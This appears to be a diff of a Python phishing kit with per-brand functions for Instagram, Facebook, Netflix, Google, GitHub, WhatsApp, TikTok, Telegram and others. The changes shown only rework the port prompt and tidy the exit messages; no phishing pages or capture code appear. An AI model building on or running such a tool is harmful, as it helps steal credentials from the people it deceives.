@@ -183,26 +183,37 @@ def instagram():
     except ValueError:
         exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Number !""")
-#====================================================================================================
+#Choose port ====================================================================================================
 
     try:
-        
-        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
-        if port > 65535:
-            exit(f"""{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
-
-       
+        while True:
+            port_input = input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET).strip()
+            
+            if not port_input:
+                port = 80
+                break
+            
+            else:
+                port = int(port_input)
+                
+                if port > 65535:    
+                    exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536{Fore.RESET}""")
+                    
+                    
+                else:
+                    break
+                
     except KeyboardInterrupt:
         exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :){Fore.RESET}""")
     except EOFError:
         exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
-    
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :){Fore.RESET}""")
     except ValueError:
         exit(f"""{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port!{Fore.RESET}""")
+
 #Run Localhost====================================================================================================
     php_server()
     
@@ -219,7 +230,7 @@ def instagram():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -241,7 +252,7 @@ def instagram():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
@@ -396,7 +407,7 @@ def facebook():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     except ValueError:
             exit(f"""{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #Run Localhost====================================================================================================
     php_server()
     
@@ -413,7 +424,7 @@ def facebook():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -435,7 +446,7 @@ def facebook():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
@@ -602,7 +613,7 @@ def netflix():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -624,7 +635,7 @@ def netflix():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
@@ -791,7 +802,7 @@ def Google():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -813,7 +824,7 @@ def Google():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
@@ -983,7 +994,7 @@ def Github():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -1005,7 +1016,7 @@ def Github():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
@@ -1173,7 +1184,7 @@ def Pubg():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -1195,7 +1206,7 @@ def Pubg():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
@@ -1367,7 +1378,7 @@ def follower():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -1389,7 +1400,7 @@ def follower():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
@@ -1561,7 +1572,7 @@ def Whatsapp():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -1583,7 +1594,7 @@ def Whatsapp():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
@@ -1738,7 +1749,7 @@ def Tiktok():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -1760,7 +1771,7 @@ def Tiktok():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
@@ -1915,7 +1926,7 @@ def Telegram():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
 #Generate Link====================================================================================================
@@ -1937,7 +1948,7 @@ def Telegram():
             rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
             
         print("                          " , end="\r")
         
